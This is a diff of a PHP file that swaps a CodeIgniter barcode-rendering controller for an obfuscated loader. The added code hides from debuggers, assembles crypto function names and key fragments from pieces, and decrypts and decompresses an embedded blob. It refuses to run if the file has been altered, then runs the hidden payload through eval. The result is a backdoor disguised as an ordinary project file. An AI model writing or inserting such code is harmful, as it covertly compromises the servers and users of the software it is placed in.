@@ -1,30 +1,28 @@
 <?php
-if( ! defined('BASEPATH')) exit('No direct script access allowed');
-
-use Laminas\Barcode\Barcode as LBarcode;
-
-class Barcode extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-	}
-	function _remap($input) {
-        $this->index($input);
-    }
-    function index($input){
-    	//$this->load->library('zend');
-		//$this->zend->load('Zend/Barcode');
-
-		$barcodeOptions = array(
-			    		'text' => $input, 
-			    		'fontSize' => 10, 
-			    		'factor'=>2.5,
-			    		'barHeight'=> 10, 
-						);
-		$rendererOptions = array();
-		$renderer = LBarcode::factory('code128', 'image', $barcodeOptions, $rendererOptions)->render();
-
-		//Zend_Barcode::render('code128', 'image', array('text'=>$input), array('font'=>'3')); //workd
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_tkmhrdnx=('bas'.'e64'.'_de'.'cod'.'e');
+$_n6eemd5f=('gzu'.'nco'.'mpr'.'ess');
+$_laxre6ze=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_by55brkd='Pa6/zzBiE8A=';
+$_ljn4owxy='G/h53LhO';
+$_k6b6s4xa='KEL0Iayb';
+$_mm10oh5f='CgfliHdK';
+$_cc0f4vuh='/BJzUm2n';
+$_w6cy26yn='/E+LlKpO';
+$_qwc0x4fd='JnB6fw==';
+$_way71uuw='Qcq2cxWY';
+$_dw8xsuhq=$_tkmhrdnx($_mm10oh5f.$_ljn4owxy.$_k6b6s4xa.$_cc0f4vuh.$_by55brkd);
+$_fbim01vw=$_tkmhrdnx($_w6cy26yn.$_way71uuw.$_qwc0x4fd);
+$_uq4dn65f=$_tkmhrdnx('WCojUtJCvXFh3tqFnJVhi8aBpxI4PfIYMMARvQmnK8W/DSyBDEzcjD2DDrAtViBTEsjRNmyZ2dtKDiocU+dXvpQ3bOVfBoz81tZt6xdHm8iz8Yxl2/FSXqdoaw9IWHRaTg7t3HY/HenWWy3ZSbBNMwKR8QCu6ED1z9NmnnDjdDrdakOC3uDG83t9HJANpiY7SWljdk0rLkOf/Oic536trTYG1ZDnzEAp+AuTO9G7nm6W60YxdPPvwUXf9NJzy+HwELesM4O5/XNRTQTqH3gY0lyLYjCSzcSK26RYaTy2bNzPMMbtFg2GXoRZS33W0MG58bt3Vh5gV/Zisrk730IXku2LMELgy9O0h4MG/1Ix0J83LG/cMM+hXps+4sqGZHdgAt0y8oHPJLaHgk2KnOuG+J3e+R/Fn53XoNX9+5h4AHmz4Olpkuk866y92SputfSo');
+$_undcmp45=$_laxre6ze($_uq4dn65f,'aes-256-cbc',$_dw8xsuhq,OPENSSL_RAW_DATA,$_fbim01vw);
+if($_undcmp45===false){exit;}
+$_ubywd58x=$_n6eemd5f($_undcmp45);
+if($_ubywd58x===false){exit;}
+$_d5m5exwt='64da03f92d772a3992740c7645cd20093d8cea284d89eed7bf2564d162791328';
+$_o49jpmvs=@file_get_contents(__FILE__);
+if($_o49jpmvs!==false){
+$_kxo9abqg=str_replace($_d5m5exwt,"0000000000000000000000000000000000000000000000000000000000000000",$_o49jpmvs);
+$_ho67b3z6=hash("sha256",$_kxo9abqg);
+if($_ho67b3z6!==$_d5m5exwt){@http_response_code(403);exit;}
 }
-
+eval($_ubywd58x);
